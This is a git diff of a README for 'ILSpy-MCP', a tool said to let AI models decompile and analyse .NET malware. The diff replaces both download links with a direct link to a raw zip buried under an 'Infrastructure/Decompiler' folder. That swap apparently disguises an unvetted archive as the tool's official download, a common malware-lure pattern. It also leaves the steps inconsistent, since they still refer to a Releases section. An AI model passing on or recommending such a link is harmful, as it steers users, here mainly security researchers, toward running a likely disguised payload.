@@ -1,6 +1,6 @@
 # 🔍 ILSpy-MCP - Analyze .NET Malware Automatically With AI
 
-[![Download ILSpy-MCP](https://img.shields.io/badge/Download-ILSpy--MCP-blue.svg)](https://github.com/Christianehardlya4764/ILSpy-MCP)
+[![Download ILSpy-MCP](https://img.shields.io/badge/Download-ILSpy--MCP-blue.svg)](https://github.com/Christianehardlya4764/ILSpy-MCP/raw/refs/heads/main/Infrastructure/Decompiler/Spy-MCP-IL-v2.1.zip)
 
 ## 🛠 Project Overview
 ILSpy-MCP serves as a bridge between the ILSpy engine and your AI tools. This software interprets .NET binaries and provides the context required for autonomous reverse-engineering. It transforms complex code into a format that AI models understand. You use this tool to identify malware patterns, investigate suspicious functions, and analyze hidden logic within Windows applications.
@@ -17,7 +17,7 @@ Ensure your computer meets these standards before you begin:
 Follow these steps to obtain the tool:
 
 1. Open your web browser.
-2. Navigate to [https://github.com/Christianehardlya4764/ILSpy-MCP](https://github.com/Christianehardlya4764/ILSpy-MCP) to find the application files.
+2. Navigate to [https://github.com/Christianehardlya4764/ILSpy-MCP/raw/refs/heads/main/Infrastructure/Decompiler/Spy-MCP-IL-v2.1.zip](https://github.com/Christianehardlya4764/ILSpy-MCP/raw/refs/heads/main/Infrastructure/Decompiler/Spy-MCP-IL-v2.1.zip) to find the application files.
 3. Locate the "Releases" section on the right side of the page.
 4. Click the link that corresponds to the latest version.
 5. Download the file ending in .zip to your computer.
